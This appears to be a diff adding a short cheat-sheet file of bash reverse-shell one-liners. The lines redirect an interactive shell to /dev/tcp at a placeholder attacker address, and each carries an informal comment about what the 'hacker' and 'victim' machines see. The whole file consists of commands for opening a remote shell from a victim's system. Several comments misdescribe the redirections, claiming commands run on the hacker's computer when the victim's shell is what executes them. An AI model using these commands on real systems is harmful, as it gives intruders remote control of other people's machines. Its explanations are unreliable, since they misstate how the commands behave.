@@ -1,0 +1,5 @@
+bash -i > /dev/tcp/x.x.x.x/xxxx ----all successful codes executed on victims system will show its output on the hackers machine
+bash -i >& /dev/tcp/x.x.x.x/xxxx ----all codes executed on victims computer will show its output on the hackers machine
+bash -i > /dev/tcp/x.x.x.x/xxxx 0>&1 ----all codes will be executed remotely on hackers computer but only invalid ones will show up its result on the victims computer
+bash -i >& /dev/tcp/x.x.x.x/xxxx 0>&1 ----all codes will be executed remotely on hackers machine
+
